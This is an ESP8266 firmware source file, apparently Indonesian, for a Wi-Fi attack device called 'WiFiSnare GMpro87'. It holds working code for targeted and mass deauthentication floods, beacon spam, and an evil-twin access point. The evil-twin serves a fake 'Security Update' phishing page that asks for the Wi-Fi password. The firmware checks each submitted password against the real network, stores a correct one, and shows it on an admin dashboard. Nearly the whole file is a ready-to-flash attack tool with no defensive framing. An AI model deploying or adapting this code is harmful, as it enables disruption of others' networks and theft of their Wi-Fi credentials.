/*
 * WiFiSnare GMpro87 - FULL ORIGINAL LOGIC + UI KUNCI
 * Feature: True Validation (WIFI_AP_STA), Deauth, Beacon, EvilTwin
 * Dev: 9u5M4n9 | HackerPro87
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

// --- HARDWARE ---
#define STROBO_PIN 15
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// --- STATE ---
DNSServer dnsServer;
ESP8266WebServer webServer(80);
IPAddress apIP(192, 168, 4, 1);
IPAddress subNetMask(255, 255, 255, 0);

String spamSSID = "WiFi_Rusuh_87";
int spamQty = 10;
String correctPassword = "";
String html_jebakan = "<h3 style='color:red'>Security Update</h3><p>Koneksi terputus, masukkan password WiFi untuk update firmware.</p><form method='get' action='/'><input type='password' name='password' placeholder='Password WiFi' required><br><br><input type='submit' value='UPDATE SEKARANG'></form>";

bool hotspot_active = false, deauthing_active = false, mass_deauth = false, beacon_active = false;
unsigned long deauth_pkt_sent = 0, beacon_pkt_sent = 0, now = 0;
int current_ch = 1;

typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; int32_t rssi; } networkDetails;
networkDetails networks[16];
networkDetails selectedNetwork;

uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x31, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00 };

// --- STORAGE ---
void savePass(String data) { for (int i = 0; i < (int)data.length(); ++i) EEPROM.write(i, data[i]); EEPROM.write(data.length(), '\0'); EEPROM.commit(); }
String readPass() { char data[150]; for (int i = 0; i < 150; i++) { data[i] = EEPROM.read(i); if (data[i] == '\0') break; } return (uint8_t)data[0] == 255 ? "" : String(data); }

// --- OLED ---
void updateOLED(String mode, String stat) {
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.drawRect(0, 0, 128, 18, WHITE);
  display.setTextSize(1); display.setCursor(40, 5); display.print("GMpro87");
  display.setTextSize(2); display.setCursor(0, 25); display.print(mode);
  display.setTextSize(1); display.setCursor(0, 52); display.print("> " + stat);
  display.display();
}

// --- WIFI ENGINE ---
void performScan() {
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < min(n, 16); ++i) {
    networks[i].ssid = (WiFi.SSID(i).length() == 0) ? "<HIDDEN>" : WiFi.SSID(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
  }
}

void sendBeacon(String ssid) {
  uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04 };
  for(int i=10; i<16; i++) packet[i] = random(256);
  for(int i=16; i<22; i++) packet[i] = packet[i-6];
  int len = ssid.length();
  packet[36] = 0x00; packet[37] = len;
  for(int i=0; i<len; i++) packet[38+i] = ssid[i];
  int pos = 38 + len;
  uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)selectedNetwork.ch};
  for(int i=0; i<13; i++) packet[pos+i] = rates[i];
  wifi_send_pkt_freedom(packet, pos+13, 0);
  beacon_pkt_sent++;
}

// --- WEB HANDLER ---
void handleIndex() {
  // TRUE VALIDATION LOGIC
  if (webServer.hasArg("password")) {
    String tryPass = webServer.arg("password");
    updateOLED("VERIFY", tryPass);
    WiFi.disconnect();
    WiFi.begin(selectedNetwork.ssid.c_str(), tryPass.c_str());
    unsigned long startTry = millis();
    bool isCorrect = false;
    while (millis() - startTry < 10000) {
      if (WiFi.status() == WL_CONNECTED) { isCorrect = true; break; }
      delay(100);
    }
    WiFi.disconnect();
    WiFi.mode(WIFI_AP_STA);
    if (isCorrect) {
      savePass(tryPass);
      webServer.send(200, "text/html", "<h2>SUCCESS! Device Rebooting...</h2>");
      hotspot_active = false;
    } else {
      webServer.send(200, "text/html", "<h2 style='color:red'>WRONG PASSWORD!</h2>" + html_jebakan);
    }
    return;
  }

  // ADMIN ACTION HANDLER
  if (webServer.hasArg("saveHtml")) html_jebakan = webServer.arg("newHtml");
  if (webServer.hasArg("updateSpam")) { spamSSID = webServer.arg("spamName"); spamQty = webServer.arg("spamQty").toInt(); }
  if (webServer.hasArg("clear")) { for(int i=0;i<150;i++) EEPROM.write(i,0); EEPROM.commit(); correctPassword = ""; }
  if (webServer.hasArg("ap")) { selectedNetwork = networks[webServer.arg("ap").toInt()]; }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  if (webServer.hasArg("rusuh")) mass_deauth = (webServer.arg("rusuh") == "start");
  if (webServer.hasArg("beacon")) beacon_active = (webServer.arg("beacon") == "start");
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "start");
    if(hotspot_active) {
      WiFi.softAPConfig(apIP, apIP, subNetMask);
      WiFi.softAP(selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", apIP);
    } else {
      WiFi.softAP("GMpro87_Admin", "Sangkur87");
    }
  }

  if (hotspot_active && !webServer.hasArg("admin")) { webServer.send(200, "text/html", html_jebakan); return; }

  correctPassword = readPass();

  // --- UI KUNCI GMpro87 ---
  String p = "<!DOCTYPE html><html><head>";
  p += "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'><style>";
  p += "body{font-family:Arial;background:#000;color:#fff;margin:0;padding:10px;text-align:center}";
  p += "@keyframes rainbow {0% {color:#ff0000;text-shadow:0 0 15px #ff0000;border-color:#ff0000;box-shadow:0 0 10px #ff0000;}20% {color:#ffff00;text-shadow:0 0 15px #ffff00;border-color:#ffff00;box-shadow:0 0 10px #ffff00;}40% {color:#00ff00;text-shadow:0 0 15px #00ff00;border-color:#00ff00;box-shadow:0 0 10px #00ff00;}60% {color:#00ffff;text-shadow:0 0 15px #00ffff;border-color:#00ffff;box-shadow:0 0 10px #00ffff;}80% {color:#ff00ff;text-shadow:0 0 15px #ff00ff;border-color:#ff00ff;box-shadow:0 0 10px #ff00ff;}100% {color:#ff0000;text-shadow:0 0 15px #ff0000;border-color:#ff0000;box-shadow:0 0 10px #ff0000;}}";
  p += ".rainbow-text {font-size:22px; font-weight:bold; text-transform:uppercase; letter-spacing:3px; margin:15px 0; display:inline-block; padding:10px 20px; border:3px solid; border-radius:10px; animation:rainbow 3s linear infinite;}";
  p += ".dev{font-size:10px;color:#888;margin-bottom:15px}.tabs{display:flex;margin-bottom:15px;border-bottom:1px solid orange}.tab-btn{flex:1;padding:12px;background:#222;color:#fff;border:none;cursor:pointer;font-size:12px}.active-tab{background:orange;color:#000;font-weight:bold}";
  p += ".ctrl{display:flex; flex-wrap:wrap; justify-content:space-between; margin-bottom:10px}.cmd-box{width:48%; background:#111; padding:5px; border-radius:4px; border:1px solid #333; margin-bottom:5px; box-sizing:border-box}";
  p += ".cmd{width:100%; padding:12px 0; border:none; border-radius:4px; color:#fff; font-weight:bold; font-size:10px; text-transform:uppercase; cursor:pointer}.log-c{font-size:10px; margin-top:4px; font-family:monospace; font-weight:bold}";
  p += "@keyframes pulse-active {0% {box-shadow:0 0 2px #fff;}50% {box-shadow:0 0 15px #fff; opacity:0.8;}100% {box-shadow:0 0 2px #fff;}}.btn-active {animation:pulse-active 0.6s infinite; border:2px solid #fff !important;}";
  p += ".pass-box{background:#050; color:#0f0; border:2px dashed #0f0; padding:12px; margin:15px 0; text-align:left; border-radius:8px; font-family:monospace}.pass-text{font-size:18px; color:#fff; font-weight:bold; display:block; margin-top:5px}";
  p += "table{width:100%; border-collapse:collapse; font-size:12px; margin-bottom:15px}th,td{padding:10px 5px; border:1px solid #146dcc}th{background:rgba(20,109,204,0.3); color:orange; text-transform:uppercase}";
  p += ".btn-sel{background:#eb3489; color:#fff; border:none; padding:6px; border-radius:4px; width:100%; font-size:11px}.btn-ok{background:#FFC72C; color:#000; border:none; padding:6px; border-radius:4px; width:100%; font-weight:bold; font-size:11px}";
  p += ".set-box{background:#111; padding:10px; border:1px solid #444; margin-bottom:15px; text-align:left; font-size:12px; border-radius:5px}.inp{background:#222; color:orange; border:1px solid orange; padding:8px; border-radius:4px; width:94%; margin:5px 0}.txt-area{width:94%; height:150px; background:#111; color:#0f0; border:1px solid #444; font-family:monospace; padding:10px}#previewModal{display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; padding:20px; box-sizing:border-box}.modal-content{background:#fff; width:100%; height:85%; border-radius:10px; overflow:auto; color:#000; text-align:left; padding:15px}hr{border:0; border-top:1px solid orange; margin:15px 0}.hidden{display:none}</style></head><body>";
  
  p += "<div class='rainbow-text'>GMpro87</div><div class='dev'>dev : 9u5M4n9 | HackerPro87</div>";
  p += "<div class='tabs'><button class='tab-btn active-tab' onclick=\"openTab('dash', this)\">DASHBOARD</button><button class='tab-btn' onclick=\"openTab('webset', this)\">SETTINGS</button></div>";
  
  p += "<div id='dash'><div class='ctrl'>";
  p += "<div class='cmd-box'><form method='post' action='/?admin=1&deauth="+String(deauthing_active?"stop":"start")+"'><button class='cmd "+String(deauthing_active?"btn-active":"")+"' style='background:#0c8'>DEAUTH</button></form><div class='log-c' style='color:#0f0'>"+String(deauth_pkt_sent)+" pkt</div></div>";
  p += "<div class='cmd-box'><form method='post' action='/?admin=1&rusuh="+String(mass_deauth?"stop":"start")+"'><button class='cmd "+String(mass_deauth?"btn-active":"")+"' style='background:#e60'>MASSDEAUTH</button></form><div class='log-c' style='color:#fff'>"+String(mass_deauth?"ACTIVE":"READY")+"</div></div>";
  p += "<div class='cmd-box'><form method='post' action='/?admin=1&beacon="+String(beacon_active?"stop":"start")+"'><button class='cmd "+String(beacon_active?"btn-active":"")+"' style='background:#60d'>BEACON</button></form><div class='log-c' style='color:#0ff'>"+String(beacon_pkt_sent)+" pkt</div></div>";
  p += "<div class='cmd-box'><form method='post' action='/?admin=1&hotspot="+String(hotspot_active?"stop":"start")+"'><button class='cmd "+String(hotspot_active?"btn-active":"")+"' style='background:#a53'>EVILTWIN</button></form><div class='log-c' style='color:#f44'>LED: "+String(hotspot_active?"ON":"OFF")+"</div></div></div>";
  
  p += "<div class='pass-box'><b>[ CAPTURED PASS ]</b><br>Target: "+selectedNetwork.ssid+"<br>Pass : <span class='pass-text'>"+(correctPassword==""?"Waiting...":correctPassword)+"</span><a href='/?admin=1&clear=1' style='color:#f44;font-size:10px;text-decoration:none'>[ RESET MEMORY ]</a></div><hr>";
  
  p += "<table><tr><th>SSID</th><th>Ch</th><th>%</th><th>TARGET</th></tr>";
  for(int i=0; i<16 && networks[i].ssid != ""; i++) {
    bool sel = (networks[i].ssid == selectedNetwork.ssid);
    p += "<tr><td>"+networks[i].ssid+"</td><td>"+String(networks[i].ch)+"</td><td>"+String(2*(networks[i].rssi+100))+"</td><td><form method='post' action='/?admin=1&ap="+String(i)+"'><button class='"+String(sel?"btn-ok":"btn-sel")+"'>"+String(sel?"SELECTED":"SELECT")+"</button></form></td></tr>";
  }
  p += "</table></div>";

  p += "<div id='webset' class='hidden'><div class='set-box'><b style='color:orange'>BEACON SPAM CONFIG:</b><br><form method='post' action='/?admin=1&updateSpam=1'>SSID Name: <input class='inp' name='spamName' value='"+spamSSID+"'><br>Qty Packet: <input class='inp' type='number' name='spamQty' value='"+String(spamQty)+"'><br><button class='btn-ok' style='width:100%'>SAVE & UPDATE</button></form></div>";
  p += "<div class='set-box'><b style='color:orange'>CUSTOM EVILTWIN HTML:</b><br><textarea id='htmlEditor' class='txt-area' name='newHtml'>"+html_jebakan+"</textarea><div style='display:flex; gap:10px; margin-top:10px'><button onclick='previewHtml()' class='btn-sel' style='flex:1; background:#00bcff'>PREVIEW</button><form method='post' action='/?admin=1&saveHtml=1' style='flex:1'><input type='hidden' id='saveData' name='newHtml'><button onclick=\"document.getElementById('saveData').value = document.getElementById('htmlEditor').value\" class='btn-ok' style='width:100%'>SAVE HTML</button></form></div></div></div>";
  
  p += "<div id='previewModal'><div class='modal-content' id='previewContainer'></div><button onclick='closePreview()' class='btn-ok' style='margin-top:20px; background:red; color:white; width:100%'>CLOSE PREVIEW</button></div>";
  p += "<script>function openTab(t,b){document.getElementById('dash').classList.add('hidden');document.getElementById('webset').classList.add('hidden');document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active-tab'));document.getElementById(t).classList.remove('hidden');b.classList.add('active-tab')}function previewHtml(){var code=document.getElementById('htmlEditor').value;var container=document.getElementById('previewContainer');container.innerHTML=code;document.getElementById('previewModal').style.display='block'}function closePreview(){document.getElementById('previewModal').style.display='none'}</script></body></html>";
  
  webServer.send(200, "text/html", p);
}

void setup() {
  EEPROM.begin(512); Wire.begin(4, 5); pinMode(STROBO_PIN, OUTPUT);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subNetMask);
  WiFi.softAP("GMpro87_Admin", "Sangkur87");
  webServer.on("/", handleIndex); webServer.onNotFound(handleIndex);
  webServer.begin(); performScan();
  updateOLED("READY", "GMpro87 ACTIVE");
}

void loop() {
  webServer.handleClient();
  if(hotspot_active) dnsServer.processNextRequest();

  // DEAUTH TARGET
  if (deauthing_active && millis() - now >= 200) {
    wifi_set_channel(selectedNetwork.ch);
    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
    wifi_send_pkt_freedom(deauthPacket, 26, 0); deauth_pkt_sent++;
    updateOLED("DEAUTH", String(deauth_pkt_sent) + " pkt"); now = millis();
  }

  // MASS DEAUTH (RUSUH)
  if (mass_deauth && millis() - now >= 150) {
    current_ch++; if(current_ch > 13) current_ch = 1;
    wifi_set_channel(current_ch);
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(&deauthPacket[10], broadcast, 6); memcpy(&deauthPacket[16], broadcast, 6);
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    updateOLED("RUSUH", "CH:" + String(current_ch)); now = millis();
  }

  // BEACON SPAM
  if (beacon_active && millis() - now >= 100) {
    for(int i=0; i<spamQty; i++) sendBeacon(spamSSID + "_" + String(i));
    updateOLED("BEACON", String(beacon_pkt_sent) + " pkt"); now = millis();
  }

  static unsigned long last_scan = 0;
  if (millis() - last_scan > 60000) { performScan(); last_scan = millis(); }
}
